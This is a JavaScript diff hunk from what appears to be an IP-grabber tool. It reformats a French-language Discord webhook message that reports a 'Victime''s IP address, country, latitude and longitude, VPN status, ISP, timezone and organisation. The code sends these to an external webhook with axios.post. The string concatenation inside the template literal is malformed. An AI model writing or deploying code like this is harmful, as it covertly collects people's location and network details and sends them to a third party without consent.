@@ -44,25 +44,25 @@
         // send the IP address to the Discord webhook
         axios.post(webhookUrl, {
           content: `**IP De la Victime: ${ip}** +
-"\n>**Pays de la Victime: ${country}** +
-"\n>**Drapeau du Pays de la Victime: ${flag}** +
-"\n>**Code Du Pays de la Victime: ${countrycode}** +
-"\n>**Code de Geo du pays De la Victime: ${countrygeo}** +
-"\n>**Continent ou se trouve la Victime: ${continent}** +
-"\n>**Code De Geo du Continent ou se trouve la Victime: ${continentcode}** +
-"\n>**ID Du Continent ou se trouve la Victime: ${continentgeo}** +
-"\n>**X: ${longitude}** +
-"\n>**Y: ${latitude}** +
-"\n>**La Victime a un vpn ?: ${vpn}** +
-"\n>**Nom Du TimeZone de la Victime: ${timezonename}** +
-"\n>**Nom Raccourci Du TimeZone de la Victime: ${nameabbreviation}** +
-"\n>**Heure actuelle de la Victime: ${currentime}** +
-"\n>**Monnaie d'échange du Pays de la Victime: ${currency}** +
-"\n>**Code de la Monnaie d'échange du pays de la Victime: ${currencycode}** +
-"\n>**Opérateur de la Victime: ${operateur}** +
-"\n>**Type de connexion: ${typedeco}** +
-"\n>**ISP: ${isp}** +
-"\n>**Nom De l'organisation: ${organame}**`
+"\n>__Pays de la Victime__: **${country}** +
+"\n>__Drapeau du Pays de la Victime__: **${flag}** +
+"\n>__Code Du Pays de la Victime__: **${countrycode}** +
+"\n>__Code de Geo du pays De la Victime__: **${countrygeo}** +
+"\n>__Continent ou se trouve la Victime__: **${continent}** +
+"\n>__Code De Geo du Continent ou se trouve la Victime__: **${continentcode}** +
+"\n>__ID Du Continent ou se trouve la Victime__: **${continentgeo}** +
+"\n>__X__: **${longitude}** +
+"\n>__Y__: **${latitude}** +
+"\n>__La Victime a un vpn ? __: **${vpn}** +
+"\n>__Nom Du TimeZone de la Victime__: **${timezonename}** +
+"\n>__Nom Raccourci Du TimeZone de la Victime__: **${nameabbreviation}** +
+"\n>__Heure actuelle de la Victime__: *${currentime}** +
+"\n>__Monnaie d'échange du Pays de la Victime__: **${currency}** +
+"\n>__Code de la Monnaie d'échange du pays de la Victime__: **${currencycode}** +
+"\n>__Opérateur de la Victime__: **${operateur}** +
+"\n>__Type de connexion__: **${typedeco}** +
+"\n>__ISP__: **${isp}** +
+"\n>__Nom De l'organisation__: **${organame}**`
           ,
         });
       });
